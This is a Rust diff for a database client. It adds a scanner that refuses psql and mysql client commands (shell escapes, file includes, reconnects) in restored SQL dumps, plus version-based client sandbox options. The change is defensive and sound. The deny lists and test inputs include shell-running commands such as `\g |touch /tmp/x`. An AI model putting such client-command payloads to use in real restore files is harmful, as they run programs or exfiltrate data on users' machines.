@@ -7,8 +7,66 @@
 //! it in the process list: it goes to the child through its environment
 //! (`PGPASSWORD`, `MYSQL_PWD`), and [`ToolCommand::display`] and `Debug` only
 //! name the variable.
+//!
+//! # A restored SQL file is a script
+//!
+//! `psql --file` and `mysql < file` run the *client commands* a file holds
+//! (`\!`, `\copy … program`, `\o |…`, `\i` in psql; `system`, `source`, `tee`,
+//! `pager` in mysql) on this computer, so a dump from an untrusted source
+//! could start programs or read and write files. Unless
+//! [`RestoreOptions::allow_client_commands`] is set, [`restore_command`]
+//! protects each tool this way:
+//!
+//! - `psql`, every version: scanned. psql has no option that turns its
+//!   meta-commands off (`\restrict`, which pg_dump 17.6 / 18 writes, is a
+//!   command of the file itself, so a hostile file leaves it out), so
+//!   [`run`] reads the file with [`check_script`] before starting psql and
+//!   refuses it when it holds one.
+//! - MySQL's `mysql` from 8.0.43, 8.4.6 and 9.4 (when `--commands` appeared),
+//!   given the version found by [`version`]: `--commands=OFF`.
+//! - MariaDB's `mariadb` from 10.6.18, 10.11.8, 11.0.6, 11.1.5, 11.2.4,
+//!   11.4.2 and every series after 11.4: `--sandbox --binary-mode`. The
+//!   sandbox leaves `connect` on (checked with 11.8.9: `\r db host` still
+//!   reconnects, with the password the client holds); binary mode turns off
+//!   every command but `\C` and `delimiter`, and mariadb-dump's
+//!   `/*M!999999\- … */` first line and `DELIMITER ;;` still work under it.
+//! - Every other `mysql` / `mariadb`, and an unknown version: scanned, the
+//!   scan being the only protection.
+//! - `pg_restore`: nothing to do, a custom-format archive holds no client
+//!   script.
+//!
+//! The mysql / mariadb client commands (from `help` in MySQL 26.10 and
+//! MariaDB 11.8) and what stops each one:
+//!
+//! | Command | What it does | Scan | `--commands=OFF` | `--sandbox` | `--binary-mode` |
+//! |---|---|---|---|---|---|
+//! | `system` `\!` | runs a shell command | refused | off | off | off |
+//! | `source` `\.` | reads and runs a file | refused | off | off | off |
+//! | `tee` `\T` | appends the output to a file | refused | off | off | off |
+//! | `pager` `\P` | pipes the output to a program | refused | off | off with an argument | off |
+//! | `edit` `\e` | runs `$EDITOR` | refused | off | on | off |
+//! | `connect` `\r` | reconnects, to the database and host it names, with the password | refused (every `\r`) | off | **on** | off |
+//! | `ssl_session_data_print` | writes the TLS session to a file | refused | off | (MySQL only) | off |
+//! | `use` `\u` | another database of the same server | allowed | passed to the server | on | off |
+//! | `charset` `\C` | client character set | allowed (see [`check_script`]) | on | on | on |
+//! | `delimiter` `\d` | statement delimiter (`DELIMITER ;;`) | allowed | on | on | on |
+//! | `clear` `\c`, `go` `\g`, `ego` `\G`, `print` `\p`, `quit` / `exit` `\q`, `status` `\s`, `help` `\h` `\?`, `rehash` `\#`, `prompt` `\R`, `notee` `\t`, `nopager` `\n`, `warnings` `\W`, `nowarning` `\w`, `resetconnection` `\x`, `query_attributes`, `costs` `\Q`, `sandbox` `\-` | the session and the display only | allowed | off or on | on | off |
+//!
+//! The scan cannot tell the `\r` of `connect` from a carriage return inside
+//! a string (`'a\r\nb'`, how mysqldump writes one): it refuses both. Where a
+//! string ends depends on the server's `sql_mode` (`NO_BACKSLASH_ESCAPES`,
+//! `ANSI_QUOTES`), which the file itself can set in ways a scan cannot
+//! follow (a variable, a bit mask, `@saved_sql_mode`), so following quotes
+//! would leave a way through. A dump with carriage returns in its data thus
+//! needs the opt-in on a client without the options above.
+//!
+//! A version wrongly taken for a recent one fails closed: the client refuses
+//! the unknown option and runs nothing. MySQL restores also get
+//! `--local-infile=0`, so `LOAD DATA LOCAL INFILE` cannot send a file of this
+//! computer to the server.
 
 use std::ffi::OsStr;
+use std::io::Read;
 use std::path::{Path, PathBuf};
 use std::process::{ExitStatus, Stdio};
 use std::sync::Arc;
@@ -152,6 +210,97 @@ pub struct RestoreOptions {
     pub input: PathBuf,
     /// Its format.
     pub format: BackupFormat,
+    /// Run the client commands a SQL file holds (see the module
+    /// documentation): only for a file the user trusts.
+    pub allow_client_commands: bool,
+    /// The restore tool's version, from [`version`]. `None` (unknown) means
+    /// the file is scanned instead of relying on the tool's own sandbox.
+    pub tool_version: Option<ToolVersion>,
+}
+
+/// A tool's version, as `--version` prints it.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ToolVersion {
+    /// The first line of the output, to show the user.
+    pub text: String,
+    /// Major, minor and patch (0 when absent).
+    pub number: (u32, u32, u32),
+    /// Whether the tool is MariaDB's.
+    pub mariadb: bool,
+}
+
+/// The version of the tool at `path`, by running `path --version`
+/// (blocking: call it off the UI thread). `None` when it does not run or
+/// prints no version.
+pub fn version(path: &Path) -> Option<ToolVersion> {
+    let output = std::process::Command::new(path)
+        .arg("--version")
+        .stdin(Stdio::null())
+        .output()
+        .ok()?;
+    parse_version(&String::from_utf8_lossy(&output.stdout))
+}
+
+/// Reads `psql (PostgreSQL) 18.6`, `mysql  Ver 8.0.36 for Linux …`,
+/// `mysql  Ver 15.1 Distrib 10.6.18-MariaDB, …` (where 15.1 is the client
+/// protocol, not the version) and `mariadb from 11.8.9-MariaDB, client 15.2 …`.
+fn parse_version(output: &str) -> Option<ToolVersion> {
+    let text = output.lines().next()?.trim();
+    let words: Vec<&str> = text.split_whitespace().collect();
+    let word = words
+        .iter()
+        .position(|word| *word == "Distrib" || *word == "from")
+        .and_then(|at| words.get(at + 1))
+        .or_else(|| {
+            words
+                .iter()
+                .skip(1)
+                .find(|word| word.starts_with(|c: char| c.is_ascii_digit()))
+        })?;
+    let digits = word
+        .find(|c: char| !c.is_ascii_digit() && c != '.')
+        .map_or(*word, |end| &word[..end]);
+    let mut parts = digits.split('.').map(|part| part.parse::<u32>().ok());
+    let major = parts.next().flatten()?;
+    let mut next = || parts.next().flatten().unwrap_or(0);
+    Some(ToolVersion {
+        text: text.to_string(),
+        number: (major, next(), next()),
+        mariadb: text.contains("MariaDB"),
+    })
+}
+
+/// The options that turn the client commands of a MySQL / MariaDB client
+/// off, when its version has them (see the module documentation).
+fn sandbox_option(version: &ToolVersion) -> Option<&'static [&'static str]> {
+    let (major, minor, patch) = version.number;
+    let since = if version.mariadb {
+        match (major, minor) {
+            (10, 6) => 18,
+            (10, 11) => 8,
+            (11, 0) => 6,
+            (11, 1) => 5,
+            (11, 2) => 4,
+            (11, 4) => 2,
+            (11, 5..) | (12.., _) => 0,
+            _ => return None,
+        }
+    } else {
+        match (major, minor) {
+            (8, 0) => 43,
+            (8, 4) => 6,
+            (9, 4..) | (10.., _) => 0,
+            _ => return None,
+        }
+    };
+    // MariaDB's sandbox leaves `connect` (`\r db host`) on, which would
+    // send the password to a host the file names: binary mode turns every
+    // command off but `\C` and `delimiter`.
+    (patch >= since).then_some(if version.mariadb {
+        &["--sandbox", "--binary-mode"]
+    } else {
+        &["--commands=OFF"]
+    })
 }
 
 /// A route through an SSH tunnel. The tunnel's local port admits a single
@@ -186,6 +335,9 @@ pub struct ToolCommand {
     pub stdin: Option<PathBuf>,
     /// The SSH tunnel to open before starting the child.
     pub tunnel: Option<TunnelHop>,
+    /// A script the child will read ([`Tool::Psql`] or [`Tool::Mysql`]),
+    /// which [`run`] checks with [`check_script`] before starting it.
+    pub script_check: Option<(Tool, PathBuf)>,
 }
 
 impl ToolCommand {
@@ -277,6 +429,9 @@ pub fn backup_command(
             }
             args.push("--verbose".into());
             args.push("--single-transaction".into());
+            // Binary columns as hex literals: raw bytes could spell a
+            // client command for the restore check (see `check_script`).
+            args.push("--hex-blob".into());
             match options.content {
                 BackupContent::All => args.push("--routines".into()),
                 BackupContent::SchemaOnly => {
@@ -306,7 +461,9 @@ pub fn backup_command(
 
 /// The command that restores `options.input` into `options.database` with
 /// the tool at `tool_path` (see [`restore_tool`]). Refused on a read-only
-/// connection.
+/// connection. A SQL file is kept from running client commands as the
+/// module documentation says: by the tool's option, or by a check that
+/// [`run`] makes before starting the tool.
 pub fn restore_command(
     tool_path: &Path,
     params: &ConnectParams,
@@ -318,6 +475,7 @@ pub fn restore_command(
         ));
     }
     let mut command = connection_command(tool_path, params);
+    let check = |tool| (!options.allow_client_commands).then(|| (tool, options.input.clone()));
     let args = &mut command.args;
     match (params.engine, options.format) {
         (Engine::Postgres, BackupFormat::Sql) => {
@@ -329,6 +487,7 @@ pub fn restore_command(
             args.push("--set=ON_ERROR_STOP=1".into());
             args.push("--single-transaction".into());
             args.push(format!("--file={}", options.input.display()));
+            command.script_check = check(Tool::Psql);
         }
         (Engine::Postgres, BackupFormat::Custom) => {
             args.push("--verbose".into());
@@ -338,6 +497,13 @@ pub fn restore_command(
         }
         (Engine::MySql | Engine::MariaDb, BackupFormat::Sql) => {
             args.push(format!("--database={}", options.database));
+            // LOAD DATA LOCAL INFILE would send a file of this computer.
+            args.push("--local-infile=0".into());
+            let sandbox = options.tool_version.as_ref().and_then(sandbox_option);
+            match sandbox.filter(|_| !options.allow_client_commands) {
+                Some(sandbox) => args.extend(sandbox.iter().map(|option| option.to_string())),
+                None => command.script_check = check(Tool::Mysql),
+            }
             command.stdin = Some(options.input.clone());
         }
         (Engine::MySql | Engine::MariaDb, BackupFormat::Custom) => {
@@ -408,6 +574,7 @@ fn connection_command(tool_path: &Path, params: &ConnectParams) -> ToolCommand {
             port: params.port,
             port_arg,
         }),
+        script_check: None,
     }
 }
 
@@ -511,13 +678,20 @@ const CANCEL_POLL: Duration = Duration::from_millis(100);
 
 /// Runs `command`, passing every line it writes (standard output and
 /// error, as they come) to `on_line`. Returns the exit status, which may
-/// be a failure; `Err` means the tool could not be started, or
-/// [`Error::Cancelled`] when `cancel` was set (the child is killed).
+/// be a failure; `Err` means the tool could not be started, its script was
+/// refused by [`check_script`] (nothing ran), or [`Error::Cancelled`] when
+/// `cancel` was set (the child is killed).
 pub async fn run(
     command: ToolCommand,
     on_line: impl Fn(String) + Send + 'static,
     cancel: Arc<AtomicBool>,
 ) -> Result<ExitStatus> {
+    if let Some((tool, path)) = command.script_check.clone() {
+        let cancel = cancel.clone();
+        tokio::task::spawn_blocking(move || check_script(tool, &path, &cancel))
+            .await
+            .map_err(|error| Error::io("checking the script", std::io::Error::other(error)))??;
+    }
     let mut args = command.args;
     if let Some(hop) = &command.tunnel {
         let local = hop.tunnel.forward_once(&hop.host, hop.port).await?;
@@ -601,6 +775,405 @@ fn emit(read: std::io::Result<usize>, line: &mut Vec<u8>, on_line: &impl Fn(Stri
     open
 }
 
+/// Refuses, with [`Error::Config`] naming the line and the command, a SQL
+/// script holding a client command that `tool` ([`Tool::Psql`], or
+/// [`Tool::Mysql`] for both MySQL and MariaDB) would run on this computer
+/// (see the module documentation). Reads the file once in fixed-size
+/// chunks, in constant memory; blocking, so call it off the UI thread.
+/// [`run`] calls it before starting a restore, the restore dialog may call
+/// it earlier to offer the opt-in.
+///
+/// The scan ignores SQL quoting: a client command written inside a string
+/// or a function body is refused too, as are regular expressions such as
+/// `'a\w b'` whose backslash happens to spell a command followed by a
+/// space. A false alarm costs the user an explicit opt-in; reading the file
+/// the way the tool does would mean following its lexer (and the encoding
+/// the file can switch to), where any gap is a command run unasked.
+pub fn check_script(tool: Tool, path: &Path, cancel: &AtomicBool) -> Result<()> {
+    let file = std::fs::File::open(path)
+        .map_err(|error| Error::io(format!("could not open {}", path.display()), error))?;
+    let psql = tool == Tool::Psql;
+    let Some(found) = scan(psql, file, path, cancel)? else {
+        return Ok(());
+    };
+    Err(Error::Config(format!(
+        "{}, line {}: {} is a {} client command, run on this computer rather than on the \
+         server (it can start programs, read or write files, or connect elsewhere). Nothing \
+         was run. Restore this file only if you trust it, with client commands allowed.",
+        path.display(),
+        found.line,
+        found.command,
+        if psql { "psql" } else { "mysql" },
+    )))
+}
+
+/// A client command found by [`scan`].
+#[derive(Debug, PartialEq, Eq)]
+struct Finding {
+    /// 1-based line number.
+    line: u64,
+    /// The command as written (`\!`, `system`…).
+    command: String,
+}
+
+/// How much of the file [`scan`] reads at a time: all it holds of it.
+const SCAN_CHUNK: usize = 64 * 1024;
+
+/// psql meta-commands refused wherever they appear (psql 18's
+/// `exec_command`): they run programs, read or write files, connect to
+/// another server (with the password of the child's environment), or set
+/// variables, whose value psql reads again as input when a later line
+/// names it (`\set x …` then `:x` runs a command the file never spells).
+/// `\copy` (any case) and every `\lo_…` are refused too.
+const PSQL_REFUSED: [&str; 28] = [
+    "!",
+    "c",
+    "connect",
+    "cd",
+    "e",
+    "edit",
+    "ef",
+    "ev",
+    "g",
+    "gx",
+    "gexec",
+    "gset",
+    "getenv",
+    "i",
+    "include",
+    "ir",
+    "include_relative",
+    "o",
+    "out",
+    "password",
+    "prompt",
+    "pset",
+    "s",
+    "set",
+    "setenv",
+    "unset",
+    "w",
+    "write",
+];
+
+/// The other psql commands psql runs, harmless except that it hands
+/// `` `…` `` in their arguments to the shell: a backquote after one of them
+/// on its line is refused. Every name that does not start like a COPY data
+/// escape (`\N`, `\t`, `\n`, `\123`, `\x41`…) is treated this way too, so a
+/// command added by a later psql is covered; of those that do, these are
+/// the ones that take arguments.
+const PSQL_ARGUMENTS: [&str; 7] = ["bind", "bind_named", "f", "restrict", "t", "timing", "x"];
+
+/// Bytes that start a COPY text-format escape.
+const COPY_ESCAPE_STARTS: &[u8] = b"Nbfnrtvx01234567.";
+
+/// mysql commands refused as the first word of a line (any case), and
+/// their one-letter forms, refused anywhere (see the table in the module
+/// documentation).
+const MYSQL_REFUSED: [&str; 7] = [
+    "system",
+    "source",
+    "tee",
+    "pager",
+    "edit",
+    "connect",
+    "ssl_session_data_print",
+];
+const MYSQL_REFUSED_SHORT: &[u8] = b"!.TPer";
+
+/// psql's whitespace, which ends a command name.
+fn is_space(byte: u8) -> bool {
+    matches!(byte, b' ' | b'\t' | b'\n' | b'\r' | 0x0b | 0x0c)
+}
+
+/// A short word kept in a fixed buffer; `cut` when it was longer.
+#[derive(Clone, Copy)]
+struct Word {
+    bytes: [u8; 24],
+    len: usize,
+    cut: bool,
+}
+
+impl Word {
+    fn new() -> Self {
+        Self {
+            bytes: [0; 24],
+            len: 0,
+            cut: false,
+        }
+    }
+
+    fn push(&mut self, byte: u8) {
+        match self.bytes.get_mut(self.len) {
+            Some(slot) => {
+                *slot = byte;
+                self.len += 1;
+            }
+            None => self.cut = true,
+        }
+    }
+
+    fn get(&self) -> &[u8] {
+        &self.bytes[..self.len]
+    }
+
+    fn show(&self) -> String {
+        let text = String::from_utf8_lossy(self.get());
+        if self.cut {
+            format!("{text}…")
+        } else {
+            text.into_owned()
+        }
+    }
+}
+
+/// The scan's state between two bytes.
+///
+/// Backslashes are read as the tools read them, wherever they are: `\\` is
+/// one escaped pair (how COPY data and MySQL strings write a backslash), any
+/// other backslash starts a command. In the multi-byte client encodings a
+/// file may switch to (SJIS, BIG5, GBK, GB18030, UHC, JOHAB), the second
+/// byte of a character can be `\`, after a first byte >= 0x80; such a
+/// backslash is checked as a command start and never opens a pair, so
+/// `\x81\x5c\x5c!` (a character, then `\!`) is caught. UTF-8 never has a
+/// `\` inside a character: the cost is rare false alarms.
+struct Scanner {
+    psql: bool,
+    line: u64,
+    prev: u8,
+    /// An unpaired backslash was the last byte; `ambiguous` when it came
+    /// after a byte >= 0x80.
+    backslash: Option<bool>,
+    /// psql: the name of the command being read, and its line.
+    name: Option<(u64, Word)>,
+    /// psql: a command on this line whose arguments psql evaluates.
+    arguments_of: Option<Word>,
+    /// mysql: still in the leading whitespace of the line.
+    line_start: bool,
+    /// mysql: the first word of the line being read, after `high` leading
+    /// bytes >= 0x80.
+    first_word: Option<(usize, Word)>,
+}
+
+impl Scanner {
+    fn new(psql: bool) -> Self {
+        Self {
+            psql,
+            line: 1,
+            prev: b'\n',
+            backslash: None,
+            name: None,
+            arguments_of: None,
+            line_start: true,
+            first_word: None,
+        }
+    }
+
+    fn found(&self, line: u64, command: String) -> Option<Finding> {
+        Some(Finding { line, command })
+    }
+
+    fn step(&mut self, byte: u8) -> Option<Finding> {
+        let found = self.read(byte);
+        self.prev = byte;
+        found
+    }
+
+    fn read(&mut self, byte: u8) -> Option<Finding> {
+        if let Some((line, mut name)) = self.name.take() {
+            if !is_space(byte) && byte != b'\\' {
+                name.push(byte);
+                self.name = Some((line, name));
+                return None;
+            }
+            if let Some(found) = self.end_name(line, name) {
+                return Some(found);
+            }
+        }
+        if let Some(ambiguous) = self.backslash.take() {
+            if byte == b'\\' {
+                // Unambiguous: an escaped pair, both bytes consumed. After
+                // a high byte, the first may have been part of a character:
+                // this one then starts a command.
+                if ambiguous {
+                    self.backslash = Some(false);
+                }
+                return None;
+            }
+            if self.psql {
+                if !is_space(byte) {
+                    let mut name = Word::new();
+                    name.push(byte);
+                    self.name = Some((self.line, name));
+                    return None;
+                }
+            } else if MYSQL_REFUSED_SHORT.contains(&byte) {
+                return self.found(self.line, format!("\\{}", char::from(byte)));
+            }
+        }
+        if !self.psql
+            && let Some(found) = self.first_word(byte)
+        {
+            return Some(found);
+        }
+        match byte {
+            b'\\' => self.backslash = Some(self.prev >= 0x80),
+            b'\n' => {
+                self.line += 1;
+                self.arguments_of = None;
+                self.line_start = true;
+            }
+            b'`' => {
+                if let Some(name) = self.arguments_of {
+                    return self.found(
+                        self.line,
+                        format!("\\{} with a `…` shell command", name.show()),
+                    );
+                }
+            }
+            _ => {}
+        }
+        None
+    }
+
+    /// psql: the command `name` started on `line` has ended.
+    fn end_name(&mut self, line: u64, name: Word) -> Option<Finding> {
+        let text = name.get();
+        let refused = !name.cut && PSQL_REFUSED.iter().any(|cmd| cmd.as_bytes() == text)
+            || (!name.cut && text.eq_ignore_ascii_case(b"copy"))
+            || text.starts_with(b"lo_");
+        if refused {
+            return self.found(line, format!("\\{}", name.show()));
+        }
+        let evaluates = !COPY_ESCAPE_STARTS.contains(&text[0])
+            || (!name.cut && PSQL_ARGUMENTS.iter().any(|cmd| cmd.as_bytes() == text));
+        if evaluates {
+            self.arguments_of = Some(name);
+        }
+        None
+    }
+
+    /// mysql: follows the first word of the line, which mysql reads as a
+    /// command name when it is one.
+    fn first_word(&mut self, byte: u8) -> Option<Finding> {
+        let word_byte =
+            byte.is_ascii_alphanumeric() || byte == b'_' || byte == b'$' || byte >= 0x80;
+        if let Some((mut high, mut word)) = self.first_word.take() {
+            if !word_byte {
+                return self.end_first_word(high, word);
+            }
+            if byte >= 0x80 && word.len == 0 {
+                high += 1;
+            } else {
+                word.push(byte);
+            }
+            self.first_word = Some((high, word));
+        } else if self.line_start && !is_space(byte) {
+            self.line_start = false;
+            if word_byte {
+                let mut word = Word::new();
+                let high = if byte >= 0x80 {
+                    1
+                } else {
+                    word.push(byte);
+                    0
+                };
+                self.first_word = Some((high, word));
+            }
+        }
+        None
+    }
+
+    /// mysql: the first word of a line ended. mysql compares command names
+    /// in Latin-1 without case, where accented letters can equal plain
+    /// ones: a byte >= 0x80 matches any letter, and leading ones (a
+    /// byte-order mark) are also tried as absent.
+    fn end_first_word(&mut self, high: usize, word: Word) -> Option<Finding> {
+        let body = word.get();
+        let matches = |name: &[u8]| {
+            body.len() == name.len()
+                && body
+                    .iter()
+                    .zip(name)
+                    .all(|(byte, letter)| *byte >= 0x80 || byte.to_ascii_lowercase() == *letter)
+        };
+        let refused = !word.cut
+            && MYSQL_REFUSED.iter().any(|name| {
+                let name = name.as_bytes();
+                matches(name) || (high > 0 && high <= name.len() && matches(&name[high..]))
+            });
+        refused.then(|| Finding {
+            line: self.line,
+            command: word.show(),
+        })
+    }
+
+    /// Whether the next byte matters only if it is `\`, a newline or `` ` ``.
+    fn quiet(&self) -> bool {
+        self.name.is_none()
+            && self.backslash.is_none()
+            && (self.psql || (!self.line_start && self.first_word.is_none()))
+    }
+
+    /// The end of the file.
+    fn finish(&mut self) -> Option<Finding> {
+        if let Some((line, name)) = self.name.take() {
+            return self.end_name(line, name);
+        }
+        if let Some((high, word)) = self.first_word.take() {
+            return self.end_first_word(high, word);
+        }
+        None
+    }
+}
+
+/// Reads `reader` to its end (or to the first client command) in
+/// [`SCAN_CHUNK`] pieces.
+fn scan(
+    psql: bool,
+    mut reader: impl Read,
+    path: &Path,
+    cancel: &AtomicBool,
+) -> Result<Option<Finding>> {
+    let mut scanner = Scanner::new(psql);
+    let mut chunk = [0u8; SCAN_CHUNK];
+    loop {
+        if cancel.load(Ordering::Relaxed) {
+            return Err(Error::Cancelled);
+        }
+        let read = match reader.read(&mut chunk) {
+            Ok(0) => return Ok(scanner.finish()),
+            Ok(read) => read,
+            Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
+            Err(error) => {
+                return Err(Error::io(
+                    format!("could not read {}", path.display()),
+                    error,
+                ));
+            }
+        };
+        let mut rest = &chunk[..read];
+        while let Some((&byte, after)) = rest.split_first() {
+            // Between commands only these bytes change anything.
+            if scanner.quiet() {
+                let skip = rest
+                    .iter()
+                    .position(|&byte| matches!(byte, b'\\' | b'\n' | b'`'))
+                    .unwrap_or(rest.len());
+                if skip > 0 {
+                    scanner.prev = rest[skip - 1];
+                    rest = &rest[skip..];
+                    continue;
+                }
+            }
+            if let Some(found) = scanner.step(byte) {
+                return Ok(Some(found));
+            }
+            rest = after;
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -640,6 +1213,8 @@ mod tests {
             database: "shop_copy".into(),
             input: "/backups/shop.dump".into(),
             format,
+            allow_client_commands: false,
+            tool_version: None,
         }
     }
 
@@ -726,6 +1301,10 @@ mod tests {
              --port=6543 --username=ada --no-psqlrc --dbname=shop_copy --set=ON_ERROR_STOP=1 \
              --single-transaction --file=/backups/shop.dump"
         );
+        assert_eq!(
+            command.script_check,
+            Some((Tool::Psql, "/backups/shop.dump".into()))
+        );
         assert_no_secret(&command);
 
         let command = restore_command(
@@ -740,6 +1319,8 @@ mod tests {
              --host=db.example.com --port=6543 --username=ada --verbose --dbname=shop_copy \
              --single-transaction /backups/shop.dump"
         );
+        // A custom-format archive holds no client script.
+        assert_eq!(command.script_check, None);
     }
 
     #[test]
@@ -756,7 +1337,7 @@ mod tests {
         assert_eq!(
             command.display(),
             "MYSQL_PWD=••• /usr/bin/mysqldump --no-defaults --protocol=TCP --host=db.example.com \
-             --port=6543 --user=ada --ssl-mode=PREFERRED --verbose --single-transaction \
+             --port=6543 --user=ada --ssl-mode=PREFERRED --verbose --single-transaction --hex-blob \
              --routines '--result-file=/tmp/out dir/shop.sql' shop orders items"
         );
         assert_no_secret(&command);
@@ -777,7 +1358,7 @@ mod tests {
             command.display(),
             "MYSQL_PWD=••• /usr/bin/mariadb-dump --no-defaults --protocol=TCP \
              --host=db.example.com --port=6543 --user=ada --ssl --ssl-verify-server-cert \
-             --ssl-ca=/certs/ca.pem --verbose --single-transaction --no-create-info \
+             --ssl-ca=/certs/ca.pem --verbose --single-transaction --hex-blob --no-create-info \
              --skip-triggers '--result-file=/tmp/out dir/shop.sql' shop"
         );
 
@@ -802,9 +1383,488 @@ mod tests {
         assert_eq!(
             command.display(),
             "MYSQL_PWD=••• /usr/bin/mysql --no-defaults --protocol=TCP --host=db.example.com \
-             --port=6543 --user=ada --ssl-mode=PREFERRED --database=shop_copy < /backups/shop.dump"
+             --port=6543 --user=ada --ssl-mode=PREFERRED --database=shop_copy --local-infile=0 \
+             < /backups/shop.dump"
+        );
+        // Version unknown: the file is checked before mysql starts.
+        assert_eq!(
+            command.script_check,
+            Some((Tool::Mysql, "/backups/shop.dump".into()))
         );
         assert_no_secret(&command);
+    }
+
+    #[test]
+    fn versions_are_read_from_each_tool() {
+        let cases = [
+            ("psql (PostgreSQL) 18.6\n", (18, 6, 0), false),
+            ("pg_dump (PostgreSQL) 14.24 (Homebrew)", (14, 24, 0), false),
+            (
+                "pg_dump (PostgreSQL) 17.2 (Debian 17.2-1.pgdg120+1)",
+                (17, 2, 0),
+                false,
+            ),
+            (
+                "/opt/homebrew/opt/mysql-client/bin/mysql  Ver 26.10.0 for macos27.0 on arm64 \
+                 (Homebrew)",
+                (26, 10, 0),
+                false,
+            ),
+            (
+                "mysql  Ver 14.14 Distrib 5.7.44, for osx10.18 (x86_64) using  EditLine wrapper",
+                (5, 7, 44),
+                false,
+            ),
+            (
+                "mysql  Ver 15.1 Distrib 10.6.18-MariaDB, for debian-linux-gnu (x86_64) using \
+                 readline 5.2",
+                (10, 6, 18),
+                true,
+            ),
+            (
+                "mariadb from 11.8.9-MariaDB, client 15.2 for debian-linux-gnu (aarch64) using  \
+                 EditLine wrapper",
+                (11, 8, 9),
+                true,
+            ),
+        ];
+        for (text, number, mariadb) in cases {
+            let version = parse_version(text).unwrap_or_else(|| panic!("{text}"));
+            assert_eq!(
+                (version.number, version.mariadb),
+                (number, mariadb),
+                "{text}"
+            );
+            assert_eq!(version.text, text.trim());
+        }
+        assert_eq!(parse_version(""), None);
+        assert_eq!(parse_version("usage: tool [options]"), None);
+        // A binary that does not run has no version.
+        assert_eq!(version(Path::new("/nonexistent/psql")), None);
+    }
+
+    #[test]
+    fn the_sandbox_option_follows_the_client_version() {
+        let option =
+            |text: &str| sandbox_option(&parse_version(text).unwrap()).map(|all| all.join(" "));
+        for (text, expected) in [
+            ("mysql  Ver 8.0.42 for Linux", None),
+            ("mysql  Ver 8.0.43 for Linux", Some("--commands=OFF")),
+            ("mysql  Ver 8.3.0 for Linux", None),
+            ("mysql  Ver 8.4.5 for Linux", None),
+            ("mysql  Ver 8.4.6 for Linux", Some("--commands=OFF")),
+            ("mysql  Ver 9.3.0 for Linux", None),
+            ("mysql  Ver 9.4.0 for Linux", Some("--commands=OFF")),
+            ("mysql  Ver 26.10.0 for macos27.0", Some("--commands=OFF")),
+            ("mysql  Ver 14.14 Distrib 5.7.44, for osx", None),
+            ("mysql  Ver 15.1 Distrib 10.5.25-MariaDB, for x", None),
+            ("mysql  Ver 15.1 Distrib 10.6.17-MariaDB, for x", None),
+            (
+                "mysql  Ver 15.1 Distrib 10.6.18-MariaDB, for x",
+                Some("--sandbox --binary-mode"),
+            ),
+            (
+                "mariadb from 10.11.8-MariaDB, client 15.2",
+                Some("--sandbox --binary-mode"),
+            ),
+            ("mariadb from 11.3.2-MariaDB, client 15.2", None),
+            ("mariadb from 11.4.1-MariaDB, client 15.2", None),
+            (
+                "mariadb from 11.4.2-MariaDB, client 15.2",
+                Some("--sandbox --binary-mode"),
+            ),
+            (
+                "mariadb from 11.8.9-MariaDB, client 15.2",
+                Some("--sandbox --binary-mode"),
+            ),
+            (
+                "mariadb from 12.0.1-MariaDB, client 15.2",
+                Some("--sandbox --binary-mode"),
+            ),
+        ] {
+            assert_eq!(option(text).as_deref(), expected, "{text}");
+        }
+    }
+
+    #[test]
+    fn a_restore_uses_the_client_sandbox_or_a_check_unless_allowed() {
+        let restore_with = |engine, version: &str, allow| {
+            let options = RestoreOptions {
+                tool_version: parse_version(version),
+                allow_client_commands: allow,
+                ..restore(BackupFormat::Sql)
+            };
+            restore_command(Path::new("/usr/bin/mysql"), &params(engine), &options).unwrap()
+        };
+        let input = PathBuf::from("/backups/shop.dump");
+
+        let command = restore_with(Engine::MySql, "mysql  Ver 26.10.0 for macos27.0", false);
+        assert!(
+            command
+                .args
+                .ends_with(&["--local-infile=0".into(), "--commands=OFF".into()])
+        );
+        assert_eq!(command.script_check, None);
+        let command = restore_with(
+            Engine::MariaDb,
+            "mariadb from 11.8.9-MariaDB, client",
+            false,
+        );
+        assert!(command.args.ends_with(&[
+            "--local-infile=0".into(),
+            "--sandbox".into(),
+            "--binary-mode".into()
+        ]));
+        assert_eq!(command.script_check, None);
+        let command = restore_with(Engine::MySql, "mysql  Ver 8.0.36 for Linux", false);
+        assert!(command.args.ends_with(&["--local-infile=0".into()]));
+        assert_eq!(command.script_check, Some((Tool::Mysql, input.clone())));
+
+        // The opt-in: neither the option nor the check.
+        for version in [
+            "mysql  Ver 26.10.0 for macos27.0",
+            "mysql  Ver 8.0.36 for Linux",
+        ] {
+            let command = restore_with(Engine::MySql, version, true);
+            assert!(
+                command.args.ends_with(&["--local-infile=0".into()]),
+                "{version}"
+            );
+            assert_eq!(command.script_check, None);
+        }
+        let options = RestoreOptions {
+            allow_client_commands: true,
+            ..restore(BackupFormat::Sql)
+        };
+        let command = restore_command(
+            Path::new("/usr/bin/psql"),
+            &params(Engine::Postgres),
+            &options,
+        )
+        .unwrap();
+        assert_eq!(command.script_check, None);
+        assert!(command.args.contains(&"--file=/backups/shop.dump".into()));
+    }
+
+    /// What [`scan`] finds in `text`: line and command.
+    fn found(psql: bool, text: &[u8]) -> Option<(u64, String)> {
+        scan(psql, text, Path::new("test.sql"), &AtomicBool::new(false))
+            .unwrap()
+            .map(|found| (found.line, found.command))
+    }
+
+    #[test]
+    fn psql_commands_that_reach_the_computer_are_found_with_their_line() {
+        let commands =
+            PSQL_REFUSED
+                .iter()
+                .copied()
+                .chain(["copy", "COPY", "lo_export", "lo_import"]);
+        for command in commands {
+            let expected = Some((3, format!("\\{command}")));
+            for text in [
+                format!("SET a = 1;\n\nSELECT 1 \\{command} /tmp/x\n"),
+                format!("SET a = 1;\n\n\\{command} /tmp/x\nSELECT 2;\n"),
+                format!("SET a = 1;\n\n  \\{command}\n"),
+                format!("SET a = 1;\n\nSELECT 1;\\{command}"),
+                format!("SET a = 1;\n\nSELECT 1;\\{command}\\\\"),
+            ] {
+                assert_eq!(found(true, text.as_bytes()), expected, "{text:?}");
+            }
+        }
+        assert_eq!(
+            found(true, b"SELECT 1 \\g |touch /tmp/x\n"),
+            Some((1, "\\g".into()))
+        );
+        // After an escaped pair, a backslash starts a command again.
+        assert_eq!(
+            found(true, b"SELECT '\\\\\\! touch x';\n"),
+            Some((1, "\\!".into()))
+        );
+    }
+
+    #[test]
+    fn psql_backquotes_after_a_command_are_found() {
+        for text in [
+            "\\encoding `touch /tmp/x`\n",
+            "\\restrict `touch /tmp/x`key\n",
